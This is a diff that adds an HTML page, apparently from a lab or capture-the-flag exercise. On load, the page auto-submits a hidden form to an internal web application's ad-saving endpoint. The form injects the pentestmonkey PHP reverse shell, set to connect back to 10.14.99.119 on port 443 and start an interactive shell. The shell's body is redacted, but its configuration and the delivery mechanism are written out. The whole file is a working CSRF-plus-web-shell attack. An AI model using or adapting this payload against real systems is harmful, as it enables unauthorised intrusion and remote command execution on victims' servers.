@@ -1,0 +1,26 @@
+<html>
+<body onload="document.exploit.submit();">
+<form action="http://10.10.44.218/content/as/?type=ad&mode=save" method="POST" name="exploit">
+<input type="hidden" name="adk" value="shell"/>
+<textarea type="hidden" name="adv">
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.14.99.119';
+$port = 443;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+<REDACTED>
+
+&lt;/textarea&gt;
+</form>
+</body>
+</html>
